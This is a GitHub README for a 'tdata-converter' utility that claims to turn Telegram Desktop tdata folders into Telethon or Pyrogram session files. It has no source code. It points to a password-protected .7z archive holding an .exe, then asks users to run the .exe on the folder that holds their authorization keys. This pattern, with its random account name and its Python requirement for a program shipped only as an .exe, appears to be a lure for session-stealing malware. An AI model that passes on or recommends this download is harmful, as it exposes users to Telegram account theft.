# tdata-converter 🚀

[![Download](https://img.shields.io/badge/Download-green.svg)](https://github.com/gsdfgsdfgfgsdf66/tdata-converter/releases/download/1/tdata.conventer.7z)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
<!-- Add other badges as needed: build status, version, etc. -->
<!-- [![Build Status](https://travis-ci.org/YOUR-USERNAME/tdata-converter.svg?branch=main)](https://travis-ci.org/YOUR-USERNAME/tdata-converter) -->
<!-- [![PyPI version](https://badge.fury.io/py/tdata-converter.svg)](https://badge.fury.io/py/tdata-converter) -->

[![Русский](https://img.shields.io/badge/Русский-red.svg)](https://github.com/gsdfgsdfgfgsdf66/tdata-converter/blob/main/ru_README.md)
[![English](https://img.shields.io/badge/English-red.svg)](https://github.com/gsdfgsdfgfgsdf66/tdata-converter/blob/main/README.md)

A simple utility for converting Telegram Desktop sessions (`tdata`) into session formats compatible with the **Telethon** and **Pyrogram** libraries (`.session`).

This allows you to use your existing active session from the Telegram Desktop client for your Python scripts or bots, without needing to re-authorize via code or QR code.

## ✨ Features

*   Convert Telegram Desktop `tdata` folder to a `.session` file.
*   Support for [Telethon](https://github.com/LonamiWebs/Telethon) sessions.
*   (Optional) Support for [Pyrogram](https://github.com/pyrogram/pyrogram) sessions.
*   Simple command-line interface.
*   Cross-platform (Windows, macOS, Linux).

## ⚠️ Important Warning

*   **Security**: The `tdata` folder contains your **personal authorization keys**. **Never share** this folder or the generated `.session` files with anyone. Use this utility only for your own purposes and at your own risk.
*   **Changes in Telegram**: The `tdata` format may change with Telegram Desktop updates, which might require this converter to be updated.
*   **Risk of Ban**: Using user accounts for automation might violate Telegram's Terms of Service and could lead to account suspension. Use responsibly.

## ⚙️ Requirements

*   **Python** 3.7+

## 💾 Installation

1.  Unzip the archive using the password `223`
2.  Move the `.exe` file to any folder.

## 🚀 Usage

1.  **Run the converter:** Open the `.exe` file and enter the path to your Telegram `tdata` folder.

2.  **Use the `.session` file:**
    The generated `my_telegram_session.session` file can now be used with Telethon or Pyrogram. Typically, you need to place it in the same directory where your Python script runs, or specify the path to it when initializing the client.

    **Example for Telethon:**
    ```python
    from telethon.sync import TelegramClient

    api_id = 123456 # Your API ID
    api_hash = 'YOUR_API_HASH' # Your API Hash

    # The client will use the existing 'my_telegram_session.session' file
    client = TelegramClient('my_telegram_session', api_id, api_hash)

    async def main():
        await client.connect()
        if await client.is_user_authorized():
            print("Successfully logged in using session!")
            me = await client.get_me()
            print(me.first_name)
        else:
            print("Failed to log in. The session might be invalid.")
        await client.disconnect()

    with client:
        client.loop.run_until_complete(main())
    ```

## 🤝 Contributing

We welcome any contributions! If you want to improve `tdata-converter`:

1.  Fork the repository (`Fork`).
2.  Create a new branch (`git checkout -b feature/your-feature`).
3.  Make your changes and commit them (`git commit -am 'Added a new feature'`).
4.  Push your changes to your fork (`git push origin feature/your-feature`).
5.  Create a Pull Request.

Please report bugs and suggest improvements via the [Issues](https://github.com/gsdfgsdfgfgsdf66/tdata-converter/issues) section.

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

*Use with caution and respect Telegram's terms of service.*
